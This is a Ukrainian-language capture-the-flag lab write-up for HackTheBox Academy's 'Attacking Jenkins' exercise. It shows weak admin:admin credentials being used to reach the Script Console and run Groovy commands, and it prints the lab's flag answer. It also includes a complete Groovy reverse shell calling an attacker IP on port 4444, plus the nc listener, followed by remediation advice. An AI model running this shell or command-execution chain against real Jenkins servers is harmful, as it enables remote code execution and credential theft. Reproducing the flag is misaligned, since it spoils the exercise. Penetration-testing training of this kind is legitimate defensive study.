# Attacking Common Applications — Attacking Jenkins

Модуль: [Attacking Common Applications](https://academy.hackthebox.com/app/module/113)
Урок: [Attacking Jenkins](https://academy.hackthebox.com/app/module/113/section/1212)
Ціль: `10.129.201.58` (jenkins.inlanefreight.local:8000)
Креди: `admin` / `admin`

Відповідь flag.txt: `f33ling_gr00000vy!`

## Концепція

Jenkins Script Console — це вбудована функція для адміністраторів, яка дозволяє виконувати довільний Groovy-код прямо на сервері з повними правами процесу Jenkins (JVM), і при слабких облікових даних вона перетворюється на миттєвий вектор RCE без потреби у веб-шелах, WAR-файлах чи реверс-конекшенах. Це принципово простіший шлях порівняно з атакою на Tomcat, де довелося створювати JSP-shell і завантажувати його через Manager App.

## Крок 1 — Реєстрація vhost

```bash
echo '10.129.201.58 jenkins.inlanefreight.local' | sudo tee -a /etc/hosts
```

Пояснення: без цього запису DNS-резолюція `jenkins.inlanefreight.local` не працює, і браузер/curl не зможе достукатись до сервера навіть якщо порт 8000 відкритий на IP.

## Крок 2 — Логін через веб-інтерфейс

Відкрити `http://jenkins.inlanefreight.local:8000/login` і авторизуватись кредами `admin:admin`.

Пояснення: ці креди — типовий приклад CWE-521 (weak default credentials), який залишили адміністратори; Jenkins за замовчуванням не форсує зміну пароля адміна після встановлення, якщо тільки явно не налаштована ініціалізаційна процедура з рандомним паролем.

## Крок 3 — Перехід у Script Console

Шлях у веб-інтерфейсі:
```
Manage Jenkins → Script Console
```

Або прямий URL: `http://jenkins.inlanefreight.local:8000/script`

Пояснення: ця сторінка доступна лише користувачам з правами `Overall/Administer`, і саме тому слабкий пароль адміна відкриває прямий шлях до неї — Jenkins довіряє будь-кому з цією роллю виконання коду на рівні JVM без додаткових перевірок sandbox.

## Крок 4 — Виконання Groovy-команди для читання прапора

У консолі вводимо:

```groovy
println "cat /var/lib/jenkins3/flag.txt".execute().text
```

Результат:
```
f33ling_gr00000vy!
```

Пояснення механізму: метод `.execute()` — це розширення Groovy для класу `String`, яке під капотом викликає `Runtime.getRuntime().exec()`, запускаючи вказану команду як окремий OS-процес; властивість `.text` синхронно зчитує весь stdout цього процесу в рядок, а `println` виводить результат прямо на сторінці консолі. Це працює миттєво, без потреби писати JSP-код, компілювати WAR чи чекати на реверс-шел, як довелося робити для Tomcat.

## Альтернативний спосіб - повний реверс-шел через Groovy (HTB не пропустив але як варіант)

Якщо потрібен інтерактивний доступ (а не одноразова команда), у Script Console можна виконати класичний Groovy reverse shell:

```groovy
String host="10.10.15.39";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();po.flush();
  Thread.sleep(50);
  try{p.exitValue();break;}catch(Exception e){}
}
p.destroy();
s.close();
```

Перед виконанням потрібно піднятий listener: `nc -lvnp 4444` на своїй машині — це дає повноцінний shell з правами користувача Jenkins замість одноразового виводу команди.

## Чому це працює (root cause)

- **Опис:** Слабкі облікові дані адміністратора (`admin:admin`) дали повний доступ до Jenkins Script Console — вбудованої функції, що навмисно призначена для виконання довільного Groovy-коду.
- **Технічні деталі:** Це не CVE, а штатна дизайн-особливість Jenkins (CWE-306 у поєднанні з CWE-521): будь-хто з роллю `Administer` отримує необмежене виконання коду на рівні JVM-процесу без sandbox-обмежень, оскільки Script Console створена саме для адмінських задач автоматизації.
- **Ризик/Імпакт:** Повний RCE з правами користувача, під яким запущений Jenkins-процес — у цьому випадку доступ до файлової системи хоста дозволив прочитати `flag.txt` в `/var/lib/jenkins3/`, а на реальних CI/CD серверах цей вектор часто веде до крадіжки credentials, SSH-ключів та pivoting на підключені build-агенти.
- **Рекомендації:** Змінити дефолтні паролі негайно після встановлення, обмежити роль `Administer` мінімальній кількості довірених користувачів, увімкнути Jenkins' built-in security realm з обов'язковою складністю паролів, розглянути вимкнення Script Console або обмеження доступу до неї через reverse-proxy ACL.
